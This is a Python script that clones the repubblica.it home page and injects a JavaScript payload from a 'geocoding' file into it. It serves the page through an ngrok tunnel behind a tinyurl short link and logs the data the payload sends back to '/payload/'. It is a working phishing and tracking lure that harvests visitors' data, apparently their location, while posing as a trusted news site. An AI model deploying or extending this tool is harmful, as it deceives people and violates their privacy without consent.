#!/usr/bin/python3

from bs4 import BeautifulSoup	
import json 
import os, subprocess
from urllib.request import urlopen
from http.server import BaseHTTPRequestHandler, HTTPServer
from multiprocessing import Process
from functools import partial


PORT_NUMBER = 8080
url = "https://www.repubblica.it"

#This class will handles any incoming request from
#the browser 
class injectionHandler(BaseHTTPRequestHandler):
	payload = ""
	def __init__(self, payload, *args, **kwargs):
		self.payload = payload
		super().__init__(*args, **kwargs)

	def inject(self,content):
		payload = open("payloads/" + self.payload + ".js",'r').read()
		html = BeautifulSoup(content,features="html.parser")
		if html.body:
			script = html.new_tag(
				"script",				
				type='application/javascript')
			script.string=payload
			html.body.insert(0, script)
			return str(html).encode()
		
	
	#Handler for the GET requests
	def do_GET(self):
		if self.path.startswith("/payload/"):
			print ("RECEIVED PAYLOAD:" + str(self.path.split('/')[2]))
			self.send_response(200)
			return
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(self.inject(urlopen(url).read()))
		return
		
	def log_message(self, format, *args):
		return

def urlShortener(nurl):
	url = 'http://tinyurl.com/api-create.php?url=' + nurl
	r = urlopen(url).read() 
	return str(r)


def start_ngrok():
	result = subprocess.check_output(["./ngrok", "http", "8080"])
	
def getNgrokStats():
	output=""
	while output == "":
		try:
			raw_output = urlopen("http://localhost:4040/api/tunnels").read().decode()
			data = json.loads(raw_output)
			output = data['tunnels'][0]['public_url']
		except Exception as e:
			#print (str(e))
			continue
		break
	return output
def startServer():
	#start ngrok
	
	pNg = Process(target=start_ngrok)
	pNg.start()
	
	NgrokURL = getNgrokStats()
	
	print ("Public URL: " + NgrokURL)
	print ("Short URL: " + urlShortener(NgrokURL))

	try:
		#Create a web server and define the handler to manage the
		#incoming request
		handler = partial(injectionHandler, "geocoding")
		server = HTTPServer(('', PORT_NUMBER), handler)
		print ('Started httpserver on port ' , PORT_NUMBER)
		
		#Wait forever for incoming htto requests
		server.serve_forever()

	except KeyboardInterrupt:
		print ('^C received, shutting down the web server')
		server.socket.close()


startServer()













